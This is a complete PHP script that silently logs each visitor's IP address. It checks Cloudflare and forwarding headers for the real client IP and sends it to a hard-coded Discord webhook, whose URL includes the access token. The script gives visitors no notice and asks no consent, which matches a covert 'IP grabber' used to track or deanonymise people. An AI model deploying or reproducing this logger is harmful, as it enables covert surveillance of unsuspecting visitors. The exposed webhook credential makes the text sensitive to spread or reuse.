<?php
$wh = "https://discord.com/api/webhooks/1321051594963550218/jrCE9j6nRnDfddYhiOmA2D9JPIRi1l3Sxgn5sTt8OvgMXLfykYM1pw9vJWO0UQmHoqlf"; 
$ip = $_SERVER['REMOTE_ADDR'];
$hdrs = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP'];

foreach ($hdrs as $h) {
    if (!empty($_SERVER[$h])) {
        $ip = explode(',', $_SERVER[$h])[0];
        break;
    }
}

$pl = json_encode(['content' => "User IP: $ip"]);

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $pl
    ]
];

$context = stream_context_create($options);
file_get_contents($wh, false, $context);
